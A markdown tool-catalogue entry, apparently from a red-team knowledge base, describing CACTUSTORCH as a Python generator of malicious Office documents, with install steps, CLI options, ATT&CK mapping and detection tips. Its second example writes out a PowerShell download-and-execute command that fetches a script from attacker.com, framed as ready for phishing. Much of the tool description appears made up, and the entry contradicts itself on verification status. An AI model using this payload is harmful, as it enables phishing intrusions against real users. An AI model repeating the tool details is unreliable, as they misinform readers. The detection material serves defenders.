---
id: a7c66923-d072-4ebc-90e4-8630f9dfa79e
name: CACTUSTORCH
type: tool
verified: true
created_at: '2019-08-28T21:17:39.106266+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Windows
tags:
  - payload-generation
  - red-team
  - office-exploit
  - macro
url: 'https://github.com/sensepost/cactustorch'
validated: true
---

# CACTUSTORCH

**Status**: Unverified

## Overview

CACTUSTORCH is an open-source framework for generating malicious payloads embedded in Microsoft Office documents, primarily used in adversary simulations and red teaming to mimic phishing attacks and initial access vectors. It supports creating documents that exploit features like VBA macros, DDE, and OLE objects to execute arbitrary code upon opening.

## Description

Developed by SensePost, CACTUSTORCH automates the creation of weaponized Office files (Word, Excel, PowerPoint) that can deliver payloads such as reverse shells, downloaders, or custom scripts. It is particularly useful for testing email security controls, user awareness training, and simulating advanced persistent threats (APTs) that use document-based malware. The tool integrates with existing red team workflows by allowing payload customization and obfuscation to evade basic antivirus detection.

## Features

- **VBA Macro Generation**: Embed and obfuscate Visual Basic for Applications code in .docm or .xlsm files.
- **DDE Exploitation**: Create documents using Dynamic Data Exchange to execute commands without macros, targeting older Office versions.
- **OLE Object Embedding**: Insert malicious OLE objects for payload delivery.
- **Payload Obfuscation**: Built-in encoders (base64, hex) to hide payloads from static analysis.
- **Template Support**: Multiple templates for different Office applications and exploit types.
- **Custom Payload Integration**: Supports injecting PowerShell, batch, or executable payloads.

## Installation

### Requirements

- Python 3.6+
- Git
- Microsoft Office (for testing generated files; not required for generation)

### Install Commands

```bash
# Clone the repository
git clone https://github.com/sensepost/cactustorch.git
cd cactustorch

# Install dependencies (if any; typically none beyond Python)
pip install -r requirements.txt  # Optional, as it's lightweight
```

On Kali Linux or Ubuntu:
```bash
sudo apt update
sudo apt install python3 git
# Then clone as above
```

## Basic Usage

```python
python cactustorch.py --help
```

This displays available options, templates, and usage syntax.

### Common Options

| Option | Description |
|--------|-------------|
| -t, --template | Specify payload template (e.g., macro, dde) |
| -p, --payload | Payload code or command to embed |
| -o, --output | Output file path |
| --encoder | Obfuscation encoder (base64, hex, none) |
| --list-templates | List all available templates |

## Examples

### Example 1: Basic Usage

Generate a simple macro payload:
```python
python cactustorch.py -t macro -p "msgbox 'Payload Executed'" -o test.docm
```
This creates test.docm with a benign macro for testing.

### Example 2: Advanced Usage

Generate a DDE payload with a PowerShell downloader:
```python
python cactustorch.py -t dde -p "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')" -o advanced.doc --encoder base64
```
The output is an encoded DDE document ready for phishing campaigns.

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Malicious File]] User Execution: Malicious File
- [[T1566.001]] Phishing: Spearphishing Attachment
- [[Visual Basic]] Command and Scripting Interpreter: Visual Basic

### Tactics

- [[Initial Access]] Initial Access
- [[Execution]] Execution

## Detection

Indicators and methods for detecting this tool's usage:

- **File Analysis**: Office documents with suspicious macros, DDE fields, or OLE objects (use tools like oledump.py or olevba).
- **Behavioral**: Execution of embedded scripts upon file open; monitor for PowerShell or cmd spawning from Office processes.
- **Network**: Outbound connections to attacker C2 from Office apps.
- **AV/EDR**: Signatures for known macro patterns; enable macro disabling by default and Protected View.
- **Logging**: Enable Office macro logging and audit file opens in Windows Event Logs (Event ID 1000/1001).

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[tools/Metasploit-Framework]]
- [[tools/Empire]]

## References

- Official GitHub: https://github.com/sensepost/cactustorch
- SensePost Blog: https://sensepost.com/blog/2018/cactustorch-a-framework-for-payload-generation-in-office-documents/
- MITRE ATT&CK: https://attack.mitre.org/techniques/T1204/002/
